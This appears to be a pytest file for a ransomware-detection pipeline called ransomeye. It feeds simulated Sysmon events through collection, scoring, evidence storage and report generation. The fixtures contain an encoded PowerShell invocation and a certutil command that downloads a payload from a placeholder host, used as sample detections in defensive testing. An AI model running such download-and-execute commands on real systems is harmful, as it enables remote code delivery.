from ransomeye import pipeline
from ransomeye.report import generate_case_report
from ransomeye.storage import EvidenceStore


def test_suspicious_process_reaches_assessment_and_report(
    monkeypatch,
    tmp_path,
):
    events = [
        {
            "event_id": "detect-powershell",
            "timestamp": "2026-08-08T17:30:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "5000",
            "parent_pid": "4000",
            "process_guid": "powershell-guid",
            "file_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": (
                "powershell.exe -NoProfile "
                "-EncodedCommand SQBFAFgA"
            ),
            "metadata": {"rule": "Sysmon Event ID 1"},
        },
        {
            "event_id": "detect-certutil",
            "timestamp": "2026-08-08T17:30:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "pid": "6000",
            "parent_pid": "5000",
            "process_guid": "certutil-guid",
            "file_path": r"C:\Windows\System32\certutil.exe",
            "command_line": (
                "certutil.exe -urlcache -split -f "
                "https://example.invalid/payload.exe"
            ),
            "metadata": {"rule": "Sysmon Event ID 1"},
        },
    ]

    monkeypatch.setattr(
        pipeline,
        "read_process_creation_events",
        lambda limit: events,
    )

    database_path = tmp_path / "detection.db"

    result = pipeline.collect_and_store(
        database_path=database_path,
        case_id="RE-DETECTION-INT-001",
        case_name="Synthetic Detection Test",
        host="TEST-HOST",
        limit=20,
    )

    assert result["events_collected"] == 2
    assert result["findings_saved"] >= 2
    assert result["assessment"]["score"] > 0
    assert result["assessment"]["severity"] != "SAFE"

    report = generate_case_report(
        database_path,
        "RE-DETECTION-INT-001",
    )

    assert "powershell.exe" in report
    assert "certutil.exe" in report
    assert "FINDINGS" in report
    assert "No findings." not in report


def test_pipeline_detection_populates_finding_evidence_traceability(monkeypatch, tmp_path):
    events = [
        {
            "event_id": "sysmon-1-ps-001",
            "timestamp": "2026-08-08T17:30:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "5000",
            "parent_pid": "4000",
            "process_guid": "powershell-guid",
            "file_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
            "metadata": {"rule": "Sysmon Event ID 1"},
        }
    ]

    monkeypatch.setattr(pipeline, "read_process_creation_events", lambda limit: events)
    database_path = tmp_path / "traceability.db"

    result = pipeline.collect_and_store(
        database_path=database_path,
        case_id="CASE-TRACE-001",
        case_name="Traceability Test",
        limit=10,
    )

    store = EvidenceStore(database_path)
    findings = store.get_case_findings("CASE-TRACE-001")
    store.close()

    assert len(findings) >= 1
    finding = findings[0]
    assert finding["event_ids"]
    assert finding["event_ids"] == ["sysmon-1-ps-001"]


def test_one_finding_links_to_multiple_triggering_events(tmp_path):
    database_path = tmp_path / "multi_trigger.db"
    store = EvidenceStore(database_path)
    store.create_case("CASE-MULTI-TRIG", "Multi Trigger Test")

    store.save_event("CASE-MULTI-TRIG", {"event_id": "evt-trig-1", "timestamp": "2026-08-08T10:00:00Z", "source": "sysmon", "event_type": "process_creation"})
    store.save_event("CASE-MULTI-TRIG", {"event_id": "evt-trig-2", "timestamp": "2026-08-08T10:00:01Z", "source": "sysmon", "event_type": "process_creation"})

    finding_dict = {
        "type": "multi_event_detection",
        "score": 30,
        "confidence": 0.85,
        "reason": "Sequence of events matched",
        "event_ids": ["evt-trig-1", "evt-trig-2"],
    }
    store.save_finding("CASE-MULTI-TRIG", finding_dict)

    findings = store.get_case_findings("CASE-MULTI-TRIG")
    assert len(findings) == 1
    assert set(findings[0]["event_ids"]) == {"evt-trig-1", "evt-trig-2"}
    store.close()


def test_multiple_findings_link_to_same_event(tmp_path):
    database_path = tmp_path / "same_event.db"
    store = EvidenceStore(database_path)
    store.create_case("CASE-SAME-EVT", "Same Event Test")
    store.save_event("CASE-SAME-EVT", {"event_id": "shared-evt-100", "timestamp": "2026-08-08T10:00:00Z", "source": "sysmon", "event_type": "process_creation"})

    fid1 = store.save_finding("CASE-SAME-EVT", {"type": "rule_a", "score": 10, "reason": "rule a"}, event_ids=["shared-evt-100"])
    fid2 = store.save_finding("CASE-SAME-EVT", {"type": "rule_b", "score": 15, "reason": "rule b"}, event_ids=["shared-evt-100"])

    assert store.get_finding_event_ids(fid1) == ["shared-evt-100"]
    assert store.get_finding_event_ids(fid2) == ["shared-evt-100"]
    store.close()


def test_finding_without_event_id_remains_backward_compatible(tmp_path):
    database_path = tmp_path / "no_event.db"
    store = EvidenceStore(database_path)
    store.create_case("CASE-NO-EVT", "No Event Test")

    fid = store.save_finding("CASE-NO-EVT", {"type": "manual_finding", "score": 5, "reason": "manual analyst finding"})

    findings = store.get_case_findings("CASE-NO-EVT")
    assert len(findings) == 1
    assert findings[0]["event_ids"] == []
    assert store.get_finding_event_ids(fid) == []
    store.close()
